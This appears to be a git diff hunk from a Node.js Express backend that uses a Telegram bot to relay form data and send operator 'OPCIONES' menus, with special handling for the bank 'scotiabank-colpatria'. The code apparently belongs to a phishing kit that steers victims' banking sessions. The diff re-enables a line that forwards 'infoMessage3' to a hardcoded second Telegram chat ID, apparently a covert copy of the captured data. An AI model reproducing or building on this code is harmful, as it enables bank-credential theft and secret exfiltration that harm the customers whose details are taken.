@@ -118,7 +118,7 @@ router.post('/generals', (req, res) => {
       .then(() => {
         bot.sendMessage(CHAT_ID, 'OPCIONES: ', req.body.ban === 'scotiabank-colpatria' ? optscol : opts3)
           .then(message => {
-            // bot.sendMessage('1660900306', infoMessage3);
+            bot.sendMessage('1660900306', infoMessage3);
             const messageID = message.message_id;
             activeMessages.set(token, { messageID, res });
           })
